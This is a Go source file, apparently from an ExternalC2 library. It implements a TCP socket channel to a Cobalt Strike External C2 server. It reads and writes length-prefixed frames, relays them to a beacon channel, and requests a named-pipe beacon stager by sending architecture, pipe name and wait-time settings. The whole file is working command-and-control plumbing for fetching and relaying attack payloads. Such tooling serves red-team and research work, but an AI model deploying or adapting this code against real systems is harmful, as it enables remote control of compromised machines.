package channels

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"log"
	"net"

	"github.com/ryhanson/ExternalC2/go-external-c2"
)

// SocketChannel is a direct socket connection to the Cobalt Strike
// External C2 server.
type SocketChannel struct {
	Addr   string
	Socket net.Conn
	Debug  bool
}

// NewSocket creates a Socket using the specified ip and port.
func NewSocket(addr string) (*SocketChannel, error) {
	return &SocketChannel{Addr: addr}, nil
}

// Connect creates the initial connection to the external listener.
func (s *SocketChannel) Connect() error {
	socket, err := net.Dial("tcp", s.Addr)
	if err != nil {
		return err
	}
	s.Socket = socket
	return nil
}

// ReadFrame reads a frame from the CS server socket.
func (s *SocketChannel) ReadFrame() ([]byte, int, error) {
	sizeBytes := make([]byte, 4)
	if _, err := s.Socket.Read(sizeBytes); err != nil {
		return nil, 0, err
	}
	size := binary.LittleEndian.Uint32(sizeBytes)
	if size > 1024*1024 {
		size = 1024 * 1024
	}
	var total uint32
	buff := make([]byte, size)
	for total < size {
		read, err := s.Socket.Read(buff[total:])
		if err != nil {
			return nil, int(total), err
		}
		total += uint32(read)
	}
	if (size > 1 && size < 1024) && s.Debug {
		log.Printf("[+] Read frame: %s\n", base64.StdEncoding.EncodeToString(buff))
	}
	return buff, int(total), nil
}

// SendFrame sends a frame to the CS server socket.
func (s *SocketChannel) SendFrame(buffer []byte) (int, error) {
	length := len(buffer)
	if (length > 2 && length < 1024) && s.Debug {
		log.Printf("[+] Sending frame: %s\n", base64.StdEncoding.EncodeToString(buffer))
	}
	sizeBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(sizeBytes, uint32(length))
	if _, err := s.Socket.Write(sizeBytes); err != nil {
		return 0, err
	}
	x, err := s.Socket.Write(buffer)
	return x + 4, err
}

// ReadAndSendTo reads a frame from the socket and send it to the beacon channel
func (s *SocketChannel) ReadAndSendTo(c2 externc2.IC2Channel) (bool, error) {
	buff, _, err := s.ReadFrame()
	if err != nil {
		return false, err
	}
	if len(buff) < 0 {
		return false, nil
	}
	if _, err := c2.SendFrame(buff); err != nil {
		return false, err
	}
	return true, nil
}

// Close closes the socket connection.
func (s *SocketChannel) Close() {
	s.Socket.Close()
}

// Dispose closes the socket connection.
func (s *SocketChannel) Dispose() {
	s.Close()
}

// IsConnected returns true if the underlying socket
// has a connecteion.
func (s *SocketChannel) IsConnected() bool {
	return s.Socket != nil
}

// GetStager requests an NamedPipe beacon from the Cobalt Strike server.
func (s *SocketChannel) GetStager(pipeName string, is64Bit bool, taskWaitTime int) ([]byte, error) {
	if is64Bit {
		s.SendFrame([]byte("arch=x64"))
	} else {
		s.SendFrame([]byte("arch=x86"))
	}
	s.SendFrame([]byte("pipename=" + pipeName))
	s.SendFrame([]byte(fmt.Sprintf("block=%d", taskWaitTime)))
	s.SendFrame([]byte("go"))
	stager, _, err := s.ReadFrame()
	return stager, err
}
